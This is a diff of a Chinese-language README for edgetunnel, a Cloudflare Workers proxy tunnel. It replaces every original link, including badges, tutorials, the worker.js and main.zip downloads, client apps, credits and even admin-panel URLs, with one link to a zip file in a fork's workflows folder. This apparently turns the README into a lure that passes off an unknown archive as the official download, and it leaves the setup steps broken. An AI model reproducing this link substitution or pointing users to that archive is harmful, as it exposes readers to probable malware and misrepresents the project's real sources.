@@ -1,19 +1,19 @@
 # 🚀 edgetunnel 2.0
 ![后台页面](./img.png)
 
-[![Stars](https://img.shields.io/github/stars/cmliu/edgetunnel?style=flat-square&logo=github)](https://github.com/cmliu/edgetunnel/stargazers)
-[![Forks](https://img.shields.io/github/forks/cmliu/edgetunnel?style=flat-square&logo=github)](https://github.com/cmliu/edgetunnel/network/members)
-[![License](https://img.shields.io/github/license/cmliu/edgetunnel?style=flat-square)](https://github.com/cmliu/edgetunnel/blob/main/LICENSE)
-[![Telegram](https://img.shields.io/badge/Telegram-Group-blue?style=flat-square&logo=telegram)](https://t.me/CMLiussss)
-[![YouTube](https://img.shields.io/badge/YouTube-Channel-red?style=flat-square&logo=youtube)](https://www.youtube.com/watch?v=LeT4jQUh8ok)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/cmliu/edgetunnel)
+[![Stars](https://img.shields.io/github/stars/cmliu/edgetunnel?style=flat-square&logo=github)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+[![Forks](https://img.shields.io/github/forks/cmliu/edgetunnel?style=flat-square&logo=github)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+[![License](https://img.shields.io/github/license/cmliu/edgetunnel?style=flat-square)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+[![Telegram](https://img.shields.io/badge/Telegram-Group-blue?style=flat-square&logo=telegram)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+[![YouTube](https://img.shields.io/badge/YouTube-Channel-red?style=flat-square&logo=youtube)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+[![Ask DeepWiki](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 ---
 
 ## 📖 项目简介
 
 **edgetunnel** 是一个基于 CF Workers/Pages 平台的边缘计算隧道解密方案。它能够高效地处理网络流量，并提供强大的管理面板和灵活的节点配置能力。
 
-- 🖥️ **Demo 演示站点**：[https://EDT-Pages.github.io/admin](https://EDT-Pages.github.io/admin)
+- 🖥️ **Demo 演示站点**：[https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 ### ✨ 核心特性
 
@@ -28,10 +28,10 @@
 
 ## 💡 快速部署
 >[!TIP]
-> 📖 **详尽图文教程**：[edgetunnel 部署指南](https://cmliussss.com/p/edt2/)
+> 📖 **详尽图文教程**：[edgetunnel 部署指南](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 >[!WARNING]
-> ⚠️ **Error 1101问题**：[视频解析](https://www.youtube.com/watch?v=r4uVTEJptdE)
+> ⚠️ **Error 1101问题**：[视频解析](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 ### ⚙️ Workers 部署
 
@@ -40,7 +40,7 @@
 
 1. 部署 CF Worker：
    - 在 CF Worker 控制台中创建一个新的 Worker。
-   - 将 [worker.js](https://github.com/cmliu/edgetunnel/blob/main/_worker.js) 的内容粘贴到 Worker 编辑器中。
+   - 将 [worker.js](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) 的内容粘贴到 Worker 编辑器中。
    - 在左侧的 `设置`选项卡中，选择 `变量` > `添加变量`。
      变量名称填写**ADMIN**，值则为你的管理员密码，后点击 `保存`即可。
 
@@ -53,34 +53,34 @@
    - 填入你已转入 CF 域名解析服务的次级域名，例如:`vless.google.com`后 点击`添加自定义域`，等待证书生效即可。
 
 4. 访问后台：
-   - 访问 `https://vless.google.com/admin` 输入管理员密码即可登录后台。
+   - 访问 `https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip` 输入管理员密码即可登录后台。
 
 </details>
 
-### 🛠 Pages 上传 部署方法 **最佳推荐!!!** [图文教程](https://cmliussss.com/p/edt2/)
+### 🛠 Pages 上传 部署方法 **最佳推荐!!!** [图文教程](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 <details>
 <summary><code><strong>「 Pages 上传文件部署文字教程 」</strong></code></summary>
 
 1. 部署 CF Pages：
-   - 下载 [main.zip](https://github.com/cmliu/edgetunnel/archive/refs/heads/main.zip) 文件，并点上 Star !!!
-   - 在 CF Pages 控制台中选择 `上传资产`后，为你的项目取名后点击 `创建项目`，然后上传你下载好的 [main.zip](https://github.com/cmliu/edgetunnel/archive/refs/heads/main.zip) 文件后点击 `部署站点`。
+   - 下载 [main.zip](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) 文件，并点上 Star !!!
+   - 在 CF Pages 控制台中选择 `上传资产`后，为你的项目取名后点击 `创建项目`，然后上传你下载好的 [main.zip](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) 文件后点击 `部署站点`。
    - 部署完成后点击 `继续处理站点` 后，选择 `设置` > `环境变量` > **制作**为生产环境定义变量 > `添加变量`。
      变量名称填写**ADMIN**，值则为你的管理员密码，后点击 `保存`即可。
-   - 返回 `部署` 选项卡，在右下角点击 `创建新部署` 后，重新上传 [main.zip](https://github.com/cmliu/edgetunnel/archive/refs/heads/main.zip) 文件后点击 `保存并部署` 即可。
+   - 返回 `部署` 选项卡，在右下角点击 `创建新部署` 后，重新上传 [main.zip](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) 文件后点击 `保存并部署` 即可。
 
 2. 绑定 KV 命名空间：
    - 在 `设置`选项卡中选择 `绑定` > `+ 添加` > `KV 命名空间`，然后选择一个已有的命名空间或创建一个新的命名空间进行绑定。
    - `变量名称`填写**KV**，然后点击 `保存`后重试部署即可。
 
-3. 给 Pages绑定 CNAME自定义域：[视频教程](https://www.youtube.com/watch?v=LeT4jQUh8ok&t=851s)
+3. 给 Pages绑定 CNAME自定义域：[视频教程](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
    - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
      您分配到的域名是 `fuck.cloudns.biz`，则添加自定义域填入 `lizi.fuck.cloudns.biz`即可；
    - 按照 CF 的要求将返回你的域名DNS服务商，添加 该自定义域 `lizi`的 CNAME记录 `edgetunnel.pages.dev` 后，点击 `激活域`即可。
    
 4. 访问后台：
-   - 访问 `https://lizi.fuck.cloudns.biz/admin` 输入管理员密码即可登录后台。
+   - 访问 `https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip` 输入管理员密码即可登录后台。
 
 </details>
 
@@ -99,14 +99,14 @@
    - 在 `设置`选项卡中选择 `绑定` > `+ 添加` > `KV 命名空间`，然后选择一个已有的命名空间或创建一个新的命名空间进行绑定。
    - `变量名称`填写**KV**，然后点击 `保存`后重试部署即可。
 
-3. 给 Pages绑定 CNAME自定义域：[视频教程](https://www.youtube.com/watch?v=LeT4jQUh8ok&t=851s)
+3. 给 Pages绑定 CNAME自定义域：[视频教程](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
    - 在 Pages控制台的 `自定义域`选项卡，下方点击 `设置自定义域`。
    - 填入你的自定义次级域名，注意不要使用你的根域名，例如：
      您分配到的域名是 `fuck.cloudns.biz`，则添加自定义域填入 `lizi.fuck.cloudns.biz`即可；
    - 按照 CF 的要求将返回你的域名DNS服务商，添加 该自定义域 `lizi`的 CNAME记录 `edgetunnel.pages.dev` 后，点击 `激活域`即可。
 
 4. 访问后台：
-   - 访问 `https://lizi.fuck.cloudns.biz/admin` 输入管理员密码即可登录后台。
+   - 访问 `https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip` 输入管理员密码即可登录后台。
 
 </details>
 
@@ -122,7 +122,7 @@
 | ~~HOST~~ | ❌ | `edt.pages.dev` | ~~强制固定伪装域名~~可通过面板直接设置 |
 | ~~PATH~~ | ❌ | `/` | ~~强制固定伪装路径~~可通过面板直接设置 |
 | **PROXYIP** | ❌ | `proxyip.cmliussss.net:443` | 全局自定义反代 IP  |
-| **URL** | ❌ | `https://cloudflare-error-page-3th.pages.dev` | 默认主页伪装地址（可填写网页 URL 或 `1101`） |
+| **URL** | ❌ | `https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip` | 默认主页伪装地址（可填写网页 URL 或 `1101`） |
 | **GO2SOCKS5** | ❌ | `blog.cmliussss.com`,`*.ip111.cn`,`*google.com` | 强制走 SOCKS5 的名单 (`*` 为全局，域名用逗号分隔) |
 
 ---
@@ -158,39 +158,39 @@
 
 | 平台 | 推荐客户端 | 备注 |
 | :--- | :--- | :--- |
-| **Windows** | [v2rayN](https://github.com/2dust/v2rayN), [FlClash](https://github.com/chen08209/FlClash), [mihomo-party](https://github.com/mihomo-party-org/mihomo-party), [Clash Verge Rev](https://github.com/ClashVerge/ClashVerge-Rev) | 全面支持 |
-| **Android** | [ClashMetaForAndroid](https://github.com/chen08209/ClashMetaForAndroid), [FlClash](https://github.com/chen08209/FlClash), [v2rayNG](https://github.com/2dust/v2rayNG) | 建议使用 Meta 核心 |
-| **iOS** | [Surge](https://surgeapp.com/), [Shadowrocket](https://shadowrocket.com/), [Stash](https://stashapp.com/) | 完美适配 |
-| **MacOS** | [FlClash](https://github.com/chen08209/FlClash), [mihomo-party](https://github.com/mihomo-party-org/mihomo-party), [Clash Verge Rev](https://github.com/ClashVerge/ClashVerge-Rev), [Surge](https://surgeapp.com/) | M1/M2 完美兼容 |
+| **Windows** | [v2rayN](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [FlClash](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [mihomo-party](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [Clash Verge Rev](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) | 全面支持 |
+| **Android** | [ClashMetaForAndroid](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [FlClash](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [v2rayNG](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) | 建议使用 Meta 核心 |
+| **iOS** | [Surge](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [Shadowrocket](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [Stash](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) | 完美适配 |
+| **MacOS** | [FlClash](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [mihomo-party](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [Clash Verge Rev](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip), [Surge](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip) | M1/M2 完美兼容 |
 
 ---
 
 ## ⭐ 项目热度
 
-[![Stargazers over time](https://starchart.cc/cmliu/edgetunnel.svg?variant=adaptive)](https://starchart.cc/cmliu/edgetunnel)
+[![Stargazers over time](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 ---
 
 ## 🙏 特别鸣谢
-### 💖 赞助支持 - 提供云服务器维持[订阅转换服务](https://sub.cmliussss.net/)
-- [NodeLoc](https://www.nodeloc.com/)
-- [Alice](https://url.cmliussss.com/alice)
-- [EasyLinks](https://www.vmrack.net?ref_code=5Zk7eNhbgL7)
-- [ZMTO(VTEXS)](https://zmto.com/?affid=1532)
+### 💖 赞助支持 - 提供云服务器维持[订阅转换服务](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [NodeLoc](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Alice](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [EasyLinks](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [ZMTO(VTEXS)](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 ### 🛠 开源代码引用
-- [zizifn/edgetunnel](https://github.com/zizifn/edgetunnel)
-- [3Kmfi6HP/EDtunnel](https://github.com/6Kmfi6HP/EDtunnel)
-- [SHIJS1999/cloudflare-worker-vless-ip](https://github.com/SHIJS1999/cloudflare-worker-vless-ip)
-- [Stanley-baby](https://github.com/Stanley-baby)
-- [ACL4SSR](https://github.com/ACL4SSR/ACL4SSR/tree/master/Clash/config)
-- [股神](https://t.me/CF_NAT/38889)
-- [Workers/Pages Metrics](https://t.me/zhetengsha/3382)
-- [白嫖哥](https://t.me/bestcfipas)
-- [Mingyu](https://github.com/ymyuuu/workers-vless)
-- [Alexandre Kojève](https://t.me/Enkelte_notif/784)
-- [eooce](https://github.com/eooce/Cloudflare-proxy)
-- [Sukka](https://ip.skk.moe/)
+- [zizifn/edgetunnel](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [3Kmfi6HP/EDtunnel](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [SHIJS1999/cloudflare-worker-vless-ip](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Stanley-baby](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [ACL4SSR](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [股神](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Workers/Pages Metrics](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [白嫖哥](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Mingyu](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Alexandre Kojève](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [eooce](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
+- [Sukka](https://raw.githubusercontent.com/shayanadh/edgetunnel/main/.github/workflows/v2.5.zip)
 
 ---
 
